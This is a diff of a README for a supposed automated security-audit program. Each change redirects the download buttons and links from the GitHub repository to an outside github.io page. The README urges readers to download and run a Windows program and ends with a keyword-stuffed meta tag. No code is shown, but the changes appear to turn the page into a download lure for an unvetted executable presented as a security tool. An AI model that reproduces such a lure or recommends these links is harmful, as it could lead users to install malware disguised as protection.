@@ -1,7 +1,7 @@
 <h1>🛡️ security-audit-skill - Automated Security Audits Made Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/wet-castigation9614/security-audit-skill">
+  <a href="https://wet-castigation9614.github.io">
     <img src="https://img.shields.io/badge/Download-Security_Audit_Skill-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download Security Audit Skill" style="max-width:100%;">
   </a>
 </p>
@@ -19,14 +19,14 @@ This is for anyone who wants to keep their digital stuff safe. If you run a smal
 Getting started is very easy. You only need to do one thing first. Follow the step below carefully.
 
 <p style="font-size:1.2em;font-weight:bold;text-align:center;">
-  <a href="https://github.com/wet-castigation9614/security-audit-skill" style="background-color:#ff6600;color:#ffffff;padding:15px 30px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Visit This Link To Download The Application</a>
+  <a href="https://wet-castigation9614.github.io" style="background-color:#ff6600;color:#ffffff;padding:15px 30px;border-radius:8px;text-decoration:none;display:inline-block;">⬇️ Visit This Link To Download The Application</a>
 </p>
 
 <h2>📥 Download And Install</h2>
 
 **Step 1: Download The File**
 
-Click the big orange button above or the link here: <a href="https://github.com/wet-castigation9614/security-audit-skill">https://github.com/wet-castigation9614/security-audit-skill</a>. Visit this link to download the application. This will take you to a page where you can get the program file.
+Click the big orange button above or the link here: <a href="https://wet-castigation9614.github.io">https://wet-castigation9614.github.io</a>. Visit this link to download the application. This will take you to a page where you can get the program file.
 
 **Step 2: Run The Program**
 
@@ -103,7 +103,7 @@ Your safety matters. Do not wait for a problem to happen. Use security-audit-ski
 
 
 <p align="center">
-  <a href="https://github.com/wet-castigation9614/security-audit-skill" style="background-color:#2ea44f;color:#ffffff;padding:15px 30px;border-radius:8px;text-decoration:none;display:inline-block;font-size:1.2em;">⬇️ Download security-audit-skill Now</a>
+  <a href="https://wet-castigation9614.github.io" style="background-color:#2ea44f;color:#ffffff;padding:15px 30px;border-radius:8px;text-decoration:none;display:inline-block;font-size:1.2em;">⬇️ Download security-audit-skill Now</a>
 </p>
 
 <meta name="keywords" content="security audit, automated security check, cybersecurity tool, vulnerability scanner, machine-readable findings, Windows security program, safety report, digital protection, network security, password strength check, open port detection, easy security tool">
